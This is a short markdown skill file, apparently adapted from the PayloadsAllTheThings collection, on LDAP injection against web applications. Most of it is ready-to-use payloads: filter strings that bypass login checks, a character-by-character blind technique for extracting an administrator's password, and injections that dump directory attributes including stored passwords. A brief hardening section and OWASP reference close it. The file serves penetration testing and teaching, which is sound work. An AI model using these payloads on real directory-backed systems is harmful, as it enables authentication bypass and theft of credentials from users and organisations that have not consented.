---
name: ldap-injection
description: Manipulate LDAP filter syntax to bypass authentication, enumerate directory data, and exfiltrate via blind boolean/timing oracles
domain: cybersecurity
subdomain: web-application-security
tags: [ldap, ldap-injection, authentication-bypass, directory]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/LDAP Injection
---

# LDAP Injection

## Overview
User input concatenated into an LDAP search filter (`(&(uid=USER)(password=PASS))`) lets an attacker close the filter and inject conditions — frequently bypassing auth or extracting any attribute.

## Auth Bypass
Filter: `(&(uid={user})(password={pass}))`
```
user = *)(uid=*))(|(uid=*
pass = anything
→ (&(uid=*)(uid=*))(|(uid=*)(password=anything))
```
Or simpler:
```
user = admin)(&)            → (&(uid=admin)(&))(password=...))  matches all
user = *)(|(password=*
```

## Blind Extraction (Char-by-Char)
```
(&(uid=admin)(password=a*))   → True / False
(&(uid=admin)(password=ab*))
```
Iterate prefix; the response (login success/failure, length, time) is the oracle.

## Search-Result Injection
If app shows results of a search:
```
search = *)(objectClass=*
search = *)(uid=*)(userPassword=*    # if stored cleartext / hash
```

## Special Characters to Test
```
( ) * \ NUL /
%28 %29 %2a %5c %00
```

## Tools
- **Burp Intruder** + LDAP wordlist.
- **ldap-injection** nuclei templates.
- LDAP server pcap / Wireshark for confirmation.

## Hardening
- Bind variables / parameterized search via LDAP API (escape `* ( ) \` NUL).
- Use proper auth bind (compare credentials at the DC), not filter-based password matching.
- Least-privilege bind account for application searches.

## References
- `payloadsallthethings/LDAP Injection/README.md`
- OWASP LDAP Injection Prevention.
